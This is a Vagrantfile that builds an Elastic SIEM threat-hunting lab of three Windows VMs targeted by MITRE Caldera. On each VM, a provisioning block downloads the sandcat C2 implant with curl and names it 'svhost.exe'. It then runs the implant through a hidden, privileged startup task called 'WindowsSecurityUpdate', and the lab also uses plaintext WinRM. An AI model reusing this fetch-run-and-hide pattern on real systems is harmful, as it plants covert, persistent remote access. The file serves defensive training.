# Vagrantfile
# Threat Hunting Lab: Elastic SIEM + Windows Domain + MITRE Caldera + Local Cloud Sim
#
# Architecture:
#   Linux services (Elasticsearch, Kibana, Fleet Server, Caldera, LocalStack, Filebeat)
#   run as Docker containers on the host. Only the three Windows VMs run under Vagrant.
#
# VM inventory (Vagrant):
#   192.168.56.20  win11-victim   Windows 11    — Victim workstation
#   192.168.56.50  win-dc         WinSrv 2022   — Active Directory DC (lab.local)
#   192.168.56.51  win-server     WinSrv 2022   — Domain member server
#
# Docker services (host 192.168.56.1):
#   :9200 / :5601 / :8220  — Elasticsearch + Kibana + Fleet Server
#   :8888                  — MITRE Caldera C2
#   :4566                  — LocalStack
#
# Provisioning order:
#   1. Run docker/setup.sh on the host — starts all Linux services, writes
#      fleet-enrollment-token.txt to repo root and elastic-credentials.txt
#   2. win-dc         — promotes DC, writes domain-info.txt, installs Sysmon +
#                       Elastic Agent, deploys sandcat
#   3. win-server     — joins domain, installs Sysmon + Elastic Agent, deploys sandcat
#   4. win11-victim   — installs Sysmon + Elastic Agent, deploys sandcat
#
# Optional after full provisioning:
#   (none — all provisioning is automatic)
#
# Manual launch (Windows VMs only):
#   vagrant up win-dc win-server win11-victim --no-parallel

Vagrant.configure("2") do |config|

  # Disable automatic box update checks for reproducibility
  config.vm.box_check_update = false

  # ── Windows Domain Controller ──────────────────────────────────────────────────
    # Provision AFTER docker/setup.sh has written fleet-enrollment-token.txt.
    # Two-stage provisioning: setup_dc.ps1 promotes the DC, Vagrant reboots,
    # then setup_dc_post_reboot.ps1 creates users/OUs, installs Sysmon + Elastic Agent,
    # and deploys the Caldera sandcat agent.
  config.vm.define "win-dc" do |dc|
    dc.vm.box          = "gusztavvargadr/windows-server-2022-standard"
    dc.vm.hostname     = "win-dc"
    dc.vm.communicator = "winrm"
    dc.vm.network       "private_network", ip: "192.168.56.50"
    dc.vm.boot_timeout = 600

    # Give WinRM extra retries — DC promotion reboot takes longer than a normal reboot
    dc.winrm.retry_limit = 60
    dc.winrm.retry_delay = 15
    # After DC promotion, local 'vagrant' becomes 'LAB\vagrant'. NTLM negotiate over
    # port-forwarding fails to resolve the domain account. Basic auth sends credentials
    # directly and the DC resolves 'vagrant' as 'LAB\vagrant' successfully.
    dc.winrm.transport     = :plaintext
    dc.winrm.basic_auth_only = true

    dc.vm.provider "vmware_desktop" do |v|
      v.memory = 4096
      v.cpus   = 2
      v.vmx["displayname"]             = "win-dc"
      v.vmx["uefi.secureBoot.enabled"] = "FALSE"
      v.gui                = false
      v.force_vmware_license = "workstation"
      v.linked_clone       = true
    end

    # Guard: docker/setup.sh must have run first
    dc.vm.provision "shell", privileged: false, inline: <<~POWERSHELL
      if (-not (Test-Path "C:\\vagrant\\fleet-enrollment-token.txt")) {
        Write-Error "fleet-enrollment-token.txt not found. Run 'bash docker/setup.sh' first."
        exit 1
      }
    POWERSHELL

    # Stage 1: Install AD DS role and promote to DC; Vagrant reboots after
    dc.vm.provision "shell", name: "setup_dc", reboot: true, privileged: false, inline: <<~POWERSHELL
      powershell -ExecutionPolicy Bypass -File "C:\\vagrant\\scripts\\setup_dc.ps1"
    POWERSHELL

    # Stage 2: Post-reboot — create OUs/users, write domain-info.txt, install Sysmon + Elastic Agent
    dc.vm.provision "shell", name: "setup_dc_post_reboot", privileged: false, inline: <<~POWERSHELL
      powershell -ExecutionPolicy Bypass -File "C:\\vagrant\\scripts\\setup_dc_post_reboot.ps1"
    POWERSHELL

    # Deploy Caldera sandcat agent automatically during provisioning
    dc.vm.provision "shell", name: "deploy_caldera_agent", privileged: false, inline: <<~'POWERSHELL'
      powercfg /change standby-timeout-ac 0 | Out-Null
      powercfg /change hibernate-timeout-ac 0 | Out-Null
      $CalderaServer = "http://192.168.56.1:8888"
      $SandcatPath   = "C:\Users\Public\svhost.exe"
      $TaskName      = "WindowsSecurityUpdate"
      $existingTask  = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
      if ($existingTask) {
        Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
      }
      Get-Process -Name "svhost" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
      & curl.exe -fsSL -o $SandcatPath -H "file: sandcat.go-windows" -H "KEY: ADMIN123" "$CalderaServer/file/download" 2>$null
      if ($LASTEXITCODE -ne 0) { Write-Host "[caldera-agent] ERROR: download failed (exit $LASTEXITCODE)"; exit 1 }
      $Action   = New-ScheduledTaskAction -Execute $SandcatPath -Argument "-server $CalderaServer -group red"
      $Trigger  = New-ScheduledTaskTrigger -AtStartup
      $Settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0 -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
      Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -RunLevel Highest -Force | Out-Null
      Start-ScheduledTask -TaskName $TaskName
      Write-Host "[caldera-agent] Done."
      exit 0
    POWERSHELL
  end

  # ── Windows Member Server ──────────────────────────────────────────────────────
  # Provision AFTER elastic-siem (Fleet token) AND win-dc (domain-info.txt).
  # Two-stage provisioning: setup_win_server.ps1 joins the domain, Vagrant reboots,
  # then setup_win_server_tools.ps1 installs Sysmon and Elastic Agent.
  config.vm.define "win-server" do |srv|
    srv.vm.box          = "gusztavvargadr/windows-server-2022-standard"
    srv.vm.hostname     = "win-server"
    srv.vm.communicator = "winrm"
    srv.vm.network       "private_network", ip: "192.168.56.51"
    srv.vm.boot_timeout = 600

    srv.winrm.retry_limit = 30
    srv.winrm.retry_delay = 10

    srv.vm.provider "vmware_desktop" do |v|
      v.memory = 2048
      v.cpus   = 2
      v.vmx["displayname"]             = "win-server"
      v.vmx["uefi.secureBoot.enabled"] = "FALSE"
      v.gui                = false
      v.force_vmware_license = "workstation"
      v.linked_clone       = true
    end

    # Guard: docker/setup.sh and win-dc must have run first
    srv.vm.provision "shell", privileged: false, inline: <<~POWERSHELL
      if (-not (Test-Path "C:\\vagrant\\fleet-enrollment-token.txt")) {
        Write-Error "fleet-enrollment-token.txt not found. Run 'bash docker/setup.sh' first."
        exit 1
      }
      if (-not (Test-Path "C:\\vagrant\\domain-info.txt")) {
        Write-Error "domain-info.txt not found. Run 'vagrant up win-dc' first."
        exit 1
      }
    POWERSHELL

    # Stage 1: Configure network and join domain; Vagrant reboots after
    srv.vm.provision "shell", name: "setup_win_server", reboot: true, privileged: false, inline: <<~POWERSHELL
      powershell -ExecutionPolicy Bypass -File "C:\\vagrant\\scripts\\setup_win_server.ps1"
    POWERSHELL

    # Stage 2: Post-reboot — install Sysmon and Elastic Agent
    srv.vm.provision "shell", name: "setup_win_server_tools", privileged: false, inline: <<~POWERSHELL
      powershell -ExecutionPolicy Bypass -File "C:\\vagrant\\scripts\\setup_win_server_tools.ps1"
    POWERSHELL

    # Deploy Caldera sandcat agent automatically during provisioning
    srv.vm.provision "shell", name: "deploy_caldera_agent", privileged: false, inline: <<~'POWERSHELL'
      powercfg /change standby-timeout-ac 0 | Out-Null
      powercfg /change hibernate-timeout-ac 0 | Out-Null
      $CalderaServer = "http://192.168.56.1:8888"
      $SandcatPath   = "C:\Users\Public\svhost.exe"
      $TaskName      = "WindowsSecurityUpdate"
      $existingTask  = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
      if ($existingTask) {
        Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
      }
      Get-Process -Name "svhost" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
      & curl.exe -fsSL -o $SandcatPath -H "file: sandcat.go-windows" -H "KEY: ADMIN123" "$CalderaServer/file/download" 2>$null
      if ($LASTEXITCODE -ne 0) { Write-Host "[caldera-agent] ERROR: download failed (exit $LASTEXITCODE)"; exit 1 }
      $Action   = New-ScheduledTaskAction -Execute $SandcatPath -Argument "-server $CalderaServer -group red"
      $Trigger  = New-ScheduledTaskTrigger -AtStartup
      $Settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0 -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
      Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -RunLevel Highest -Force | Out-Null
      Start-ScheduledTask -TaskName $TaskName
      Write-Host "[caldera-agent] Done."
      exit 0
    POWERSHELL
  end
  # ── Windows 11 Victim ─────────────────────────────────────────────────────
  # Must be provisioned AFTER elastic-siem writes fleet-enrollment-token.txt
  config.vm.define "win11-victim" do |win|
    win.vm.box              = "gusztavvargadr/windows-11"
    win.vm.hostname         = "win11-victim"
    win.vm.communicator     = "winrm"
    win.vm.network          "private_network", ip: "192.168.56.20"
    win.vm.boot_timeout     = 600   # Windows 11 boot can exceed the 300s default

    win.vm.provider "vmware_desktop" do |v|
      v.memory = 4096
      v.cpus   = 2
      v.vmx["displayname"]              = "win11-victim"
      v.vmx["uefi.secureBoot.enabled"]  = "FALSE"
      v.gui = false
      # Force Workstation product type so vmrun uses -T ws (not -T player).
      # The utility reports "standard" license, which the plugin maps to "player"
      # mode (disabling snapshots). "workstation" forces @pro_license = true,
      # enabling vmrun -T ws + linked clone (Issues 4 and 27).
      v.force_vmware_license = "workstation"
      v.linked_clone = true
    end

    # Abort early with a clear message if docker/setup.sh hasn't run yet
    win.vm.provision "shell", inline: <<~POWERSHELL, privileged: false
      if (-not (Test-Path "C:\\vagrant\\fleet-enrollment-token.txt")) {
        Write-Error "fleet-enrollment-token.txt not found. Run 'bash docker/setup.sh' first."
        exit 1
      }
      if (-not (Test-Path "C:\\vagrant\\domain-info.txt")) {
        Write-Error "domain-info.txt not found. Run 'vagrant up win-dc' first."
        exit 1
      }
    POWERSHELL

    # Run script from shared folder — avoids WinRM file-upload bug in vagrant-vmware-desktop
    win.vm.provision "shell", name: "install_win_tools", privileged: false, inline: <<~POWERSHELL
      powershell -ExecutionPolicy Bypass -File "C:\\vagrant\\scripts\\install_win_tools.ps1"
    POWERSHELL

    # Domain-join win11-victim to lab.local (requires win-dc to be fully provisioned)
    win.vm.provision "shell", name: "join_domain", reboot: true, privileged: false, inline: <<~POWERSHELL
      powershell -ExecutionPolicy Bypass -File "C:\\vagrant\\scripts\\join_domain.ps1"
    POWERSHELL

    # Deploy Caldera sandcat agent automatically during provisioning
    win.vm.provision "shell", name: "deploy_caldera_agent", privileged: false, inline: <<~'POWERSHELL'
      powercfg /change standby-timeout-ac 0 | Out-Null
      powercfg /change hibernate-timeout-ac 0 | Out-Null
      $CalderaServer = "http://192.168.56.1:8888"
      $SandcatPath   = "C:\Users\Public\svhost.exe"
      $TaskName      = "WindowsSecurityUpdate"
      $existingTask  = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
      if ($existingTask) {
        Write-Host "[caldera-agent] Stopping existing task before re-download..."
        Stop-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
      }
      Get-Process -Name "svhost" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
      Write-Host "[caldera-agent] Downloading sandcat..."
      & curl.exe -fsSL -o $SandcatPath -H "file: sandcat.go-windows" -H "KEY: ADMIN123" "$CalderaServer/file/download" 2>$null
      if ($LASTEXITCODE -ne 0) { Write-Host "[caldera-agent] ERROR: download failed (exit $LASTEXITCODE)"; exit 1 }
      Write-Host "[caldera-agent] Registering scheduled task..."
      $Action   = New-ScheduledTaskAction -Execute $SandcatPath -Argument "-server $CalderaServer -group red"
      $Trigger  = New-ScheduledTaskTrigger -AtStartup
      $Settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0 -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
      Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -RunLevel Highest -Force | Out-Null
      Write-Host "[caldera-agent] Starting sandcat via scheduled task (survives WinRM close)..."
      Start-ScheduledTask -TaskName $TaskName
      Write-Host "[caldera-agent] Done."
      exit 0
    POWERSHELL
  end

end
